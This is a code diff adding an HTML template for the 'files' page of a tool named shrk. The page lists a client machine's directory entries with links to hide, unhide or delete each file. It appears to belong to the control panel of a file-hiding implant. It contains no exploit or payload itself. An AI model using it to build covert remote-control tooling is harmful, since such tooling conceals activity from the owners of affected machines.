@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    {% include "parts/header.html" %}
+    <title>shrk / {{client.ID}} / files</title>
+    <link href="{{path}}/static/files.css" rel="stylesheet">
+  </head>
+  <body>
+    {% include "parts/navbar.html" %}
+    <main>
+      <h1 class="path">{{dir}}</h1>
+
+      <h3 class="details">listing <strong>{{entries|length}}</strong> entries</h3>
+
+      <table class="list">
+        <tr>
+          <th>Actions</th>
+          <th>Name</th>
+          <th>Size</th>
+          <th>Permissions</th>
+          <th>UID</th>
+          <th>GID</th>
+          <th>Modification Date</th>
+          <th>Creation Date</th>
+        </tr>
+        {% for e in entries %}
+          <tr>
+            <td>
+              {% if e.Hidden %}
+                <a href="do?o=unhide&p={{qescape(join(dir, e.Name))}}">unhide</a>
+              {% else %}
+                <a href="do?o=hide&p={{qescape(join(dir, e.Name))}}">hide</a>
+              {% endif %}
+              <a href="do?o=delete&p={{qescape(join(dir, e.Name))}}">delete</a>
+            </td>
+            {% if e.IsDir %}
+              <td><a class="dir-link" href="?p={{qescape(join(dir, e.Name))}}">{{e.Name}}</a></td>
+            {% else %}
+              <td>{{e.Name}}</td>
+            {% endif %}
+            <td>{{e.HumanSize()}}</td>
+            <td>{{e.Perms()}}</td>
+            <td>{{e.UID}}</td>
+            <td>{{e.GID}}</td>
+            <td>{{e.ModificationTime()}}</td>
+            <td>{{e.CreationTime()}}</td>
+          </tr>
+        {% endfor %}
+      </table>
+    </main>
+  </body>
+</html>
